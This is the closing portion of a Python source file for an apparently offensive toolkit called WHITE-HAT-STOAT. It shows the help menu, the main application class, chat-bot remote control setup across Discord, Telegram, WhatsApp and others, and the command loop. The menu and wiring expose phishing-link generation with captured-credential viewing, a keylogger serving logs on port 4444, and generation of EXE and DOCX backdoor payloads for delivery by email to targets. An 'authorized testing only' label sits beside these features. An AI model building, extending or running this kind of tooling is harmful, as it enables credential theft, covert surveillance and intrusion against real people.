║{Colors.SUCCESS}🎣 SOCIAL ENGINEERING:{Colors.RESET}
║  phish <platform>              - Generate phishing link
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_creds [link_id]         - View captured credentials
║  phish_list                    - List phishing links
║
║{Colors.SUCCESS}🕷️ NIKTO COMMANDS:{Colors.RESET}
║  nikto <target>                - Web vulnerability scan
║  nikto_full <target>           - Full scan with all tests
║  nikto_ssl <target>            - SSL/TLS scan
║
║{Colors.SUCCESS}🔍 INFORMATION GATHERING:{Colors.RESET}
║  traceroute <target>           - Trace network path
║  whois <domain>                - WHOIS lookup
║  dns <domain> [type]           - DNS lookup
║  location <ip>                 - IP geolocation
║  scan <target>                 - Quick port scan
║  quick_scan <target>           - Quick port scan
║  full_scan <target>            - Full port scan
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP via firewall
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  report                        - Security report
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.SUCCESS}💡 EXAMPLES:{Colors.RESET}
║  ping 8.8.8.8
║  nmap_quick 192.168.1.1
║  ssh_add my-server 192.168.1.100 root
║  ssh_exec my-server "ls -la"
║  traffic icmp 192.168.1.1 10
║  nikto example.com
║  phish facebook
║  phish_start abc12345
║  keylogger_start
║  keylogger_logs 20
║  payload_gen exe backdoor
║  payload_deploy <id> email target@example.com
║
║{Colors.WHITE}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# MAIN APPLICATION
# =====================
class WhiteHatStoatApp:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.nikto = NiktoScanner(self.db)
        self.keylogger = KeyloggerModule(self.db, self.config) if KEYLOGGER_AVAILABLE else None
        self.payload_gen = PayloadGenerator(self.db, self.config)
        self.handler = CommandHandler(
            self.db, self.ssh, self.traffic, self.nikto,
            self.keylogger, self.payload_gen
        )
        
        # Platform bots
        self.discord = DiscordBot(self.handler, self.db)
        self.slack = SlackBot(self.handler, self.db)
        self.telegram = TelegramBot(self.handler, self.db)
        self.signal = SignalBot(self.handler, self.db)
        self.whatsapp = WhatsAppBot(self.handler, self.db)
        self.google_chat = GoogleChatBot(self.handler, self.db)
        self.matrix = MatrixBot(self.handler, self.db)
        self.imessage = iMessageBot(self.handler, self.db)
        self.web = WebDashboard(self.handler, self.db, self.config)
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        🦡 WHITE-HAT-STOAT v1.0.0 - Ultimate Cybersecurity Platform           {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.GRAY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🦡 21,000+ Lines of Python Code  • 🔍 IP Analysis & Reporting     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution    • 🚀 REAL Traffic Generation     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10 Start)  • 📱 Multi-Platform Bots          {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🎣 Social Engineering Suite        • 🕷️ Nikto Web Scanner            {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 💀 Payload Generation & Deployment • 🔒 IP Management               {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Discord | Telegram | WhatsApp      • Signal | Google Chat | Matrix  {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Slack | iMessage | Web Dashboard   • Black & White Theme            {Colors.PRIMARY}║
║{Colors.SUCCESS}                                                                           {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.WHITE}                    🎯 6000+ ADVANCED CYBERSECURITY COMMANDS                        {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GRAY}🦡 Welcome to WHITE-HAT-STOAT v1.0.0 - Your Ultimate Security Assistant{Colors.RESET}
{Colors.GRAY}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.GRAY}🌐 Web dashboard available at http://localhost:5000 (if enabled){Colors.RESET}
{Colors.GRAY}⌨️ Press F10 to start/stop keylogger{Colors.RESET}
{Colors.GRAY}💀 Generate payloads with 'payload_gen' commands{Colors.RESET}
"""
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'dig', 'traceroute', 'ssh', 'whois', 'nikto']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if KEYLOGGER_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if KEYLOGGER_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if MATRIX_AVAILABLE else Colors.WARNING}✅ matrix-client{Colors.RESET}" if MATRIX_AVAILABLE else f"{Colors.WARNING}⚠️ matrix-client not found - Matrix disabled{Colors.RESET}")
        
        if self.nikto.available:
            print(f"{Colors.SUCCESS}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
        
        if PYINSTALLER_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ pyinstaller - EXE payloads available{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ pyinstaller not found - EXE payload generation disabled{Colors.RESET}")
        
        if DOCX_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ python-docx - DOCX payloads available{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ python-docx not found - DOCX payload generation disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.WHITE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.WHITE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.WHITE}Enter channel ID (default: general): {Colors.RESET}").strip() or 'general'
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack.save_config(token, channel, True, prefix)
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.WHITE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.WHITE}Enter chat ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.telegram.save_config(token, chat_id, True, prefix)
                self.telegram.start()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.WHITE}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.WHITE}Enter WhatsApp phone number: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.whatsapp.save_config(phone, True, prefix)
                if self.whatsapp.setup():
                    self.whatsapp.start()
                    print(f"{Colors.SUCCESS}✅ WhatsApp bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.WHITE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.WHITE}Enter Signal phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.WHITE}Enter group ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.signal.save_config(phone, group, True, prefix)
                self.signal.start()
                print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.WHITE}Configure Google Chat webhook? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.WHITE}Enter Google Chat webhook URL: {Colors.RESET}").strip()
            space = input(f"{Colors.WHITE}Enter space ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if webhook:
                self.google_chat.save_config(webhook, space, True, prefix)
                self.google_chat.start()
                print(f"{Colors.SUCCESS}✅ Google Chat webhook configured{Colors.RESET}")
        
        # Matrix
        setup = input(f"{Colors.WHITE}Configure Matrix bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            homeserver = input(f"{Colors.WHITE}Enter Matrix homeserver (default: https://matrix.org): {Colors.RESET}").strip() or 'https://matrix.org'
            username = input(f"{Colors.WHITE}Enter Matrix username: {Colors.RESET}").strip()
            password = input(f"{Colors.WHITE}Enter Matrix password: {Colors.RESET}").strip()
            room = input(f"{Colors.WHITE}Enter room ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if username and password:
                self.matrix.save_config(homeserver, username, password, room, True, prefix)
                self.matrix.start()
                print(f"{Colors.SUCCESS}✅ Matrix bot starting...{Colors.RESET}")
        
        # iMessage (macOS only)
        if IMESSAGE_AVAILABLE:
            setup = input(f"{Colors.WHITE}Configure iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                numbers = input(f"{Colors.WHITE}Enter phone numbers (space-separated): {Colors.RESET}").strip().split()
                prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
                if numbers:
                    self.imessage.save_config(numbers, True, prefix)
                    self.imessage.start()
                    print(f"{Colors.SUCCESS}✅ iMessage bot starting...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.WHITE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.WHITE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.WHITE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.enabled', True)
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.config.save()
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
        
        # Keylogger
        setup = input(f"{Colors.WHITE}Enable Keylogger? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            if self.keylogger:
                port = input(f"{Colors.WHITE}Enter keylogger server port (default: 4444): {Colors.RESET}").strip() or '4444'
                interval = input(f"{Colors.WHITE}Enter keylogger interval in seconds (default: 30): {Colors.RESET}").strip() or '30'
                self.config.set('keylogger_port', int(port))
                self.config.set('keylogger_interval', int(interval))
                self.config.save()
                print(f"{Colors.SUCCESS}✅ Keylogger configured. Press F10 to start.{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Keylogger not available (pynput required){Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        auto_monitor = input(f"\n{Colors.WHITE}Start threat monitoring? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            print(f"{Colors.SUCCESS}✅ Threat monitoring started{Colors.RESET}")
        
        setup_platforms = input(f"{Colors.WHITE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        print(f"\n{Colors.SUCCESS}✅ WHITE-HAT-STOAT v1.0.0 ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.GRAY}   Type 'help' for commands, 'traffic_types' for traffic generation{Colors.RESET}")
        print(f"{Colors.GRAY}   Press F10 to start/stop keylogger{Colors.RESET}")
        print(f"{Colors.GRAY}   Generate payloads: payload_gen exe backdoor{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.WHITE}{self.session_id}{Colors.PRIMARY}]{Colors.WHITE} 🦡> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop_keylogger()
        self.db.close()
        
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")

def main():
    try:
        print(f"{Colors.PRIMARY}🦡 Starting WHITE-HAT-STOAT v1.0.0...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality (firewall, raw sockets){Colors.RESET}")
        
        app = WhiteHatStoatApp()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()